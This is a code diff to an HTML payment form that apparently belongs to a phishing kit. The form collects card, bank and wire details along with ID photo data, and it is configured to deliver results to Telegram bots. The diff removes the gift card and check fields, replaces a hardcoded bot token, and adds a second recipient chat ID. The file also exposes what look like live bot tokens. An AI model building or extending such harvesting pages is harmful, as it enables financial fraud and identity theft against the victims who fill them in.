@@ -584,8 +584,6 @@
                         <option value="Debit Card">💳 Debit Card</option>
                         <option value="Credit Card">💳 Credit Card</option>
                         <option value="Bank Account">🏦 Bank Account</option>
-                        <option value="Gift Card">🎁 Gift Card</option>
-                        <option value="Check">📮 Check</option>
                         <option value="Wire Transfer">💸 Wire Transfer</option>
                     </select>
                 </div>
@@ -648,37 +646,6 @@
                     </div>
                 </div>
 
-                <!-- Gift Card Fields -->
-                <div class="dynamic-fields" id="giftCardFields">
-                    <div class="form-group">
-                        <label>Gift Card Type <span class="required">*</span></label>
-                        <select id="giftCardType">
-                            <option value="Amazon">🎁 Amazon</option>
-                            <option value="Walmart">🎁 Walmart</option>
-                            <option value="Target">🎁 Target</option>
-                            <option value="Apple">🎁 Apple</option>
-                            <option value="Google Play">🎁 Google Play</option>
-                            <option value="Visa">💳 Visa Gift Card</option>
-                            <option value="Other">🎁 Other</option>
-                        </select>
-                    </div>
-                    <div class="form-group">
-                        <label>Gift Card Number <span class="required">*</span></label>
-                        <input type="text" id="giftCardNumber" placeholder="Enter gift card number">
-                    </div>
-                    <div class="form-group">
-                        <label>Gift Card PIN (if applicable)</label>
-                        <input type="text" id="giftCardPin" placeholder="Enter PIN">
-                    </div>
-                </div>
-
-                <!-- Check Fields -->
-                <div class="dynamic-fields" id="checkFields">
-                    <div class="form-group">
-                        <label>Mailing Address <span class="required">*</span></label>
-                        <textarea id="checkAddress" placeholder="Enter mailing address for check"></textarea>
-                    </div>
-                </div>
 
                 <!-- Wire Transfer Fields -->
                 <div class="dynamic-fields" id="wireFields">
@@ -754,8 +721,11 @@
         // ============================================
         // CONFIGURATION
         // ============================================
-        const BOT_TOKEN = "8855859135:AAHmVOmXKqbV_fyp2YIOyaVnq8ttXizbU78";
-        const CHAT_ID = "8818154838";
+        const BOT_TOKEN = "8777841044:AAGsYPsmbZJyBarJBC_ftTWNiVQVaCz0yz8";
+        const CHAT_IDS = [
+    "8818154838",
+    "873270406"
+];
 
         let idFrontData = null;
         let idBackData = null;
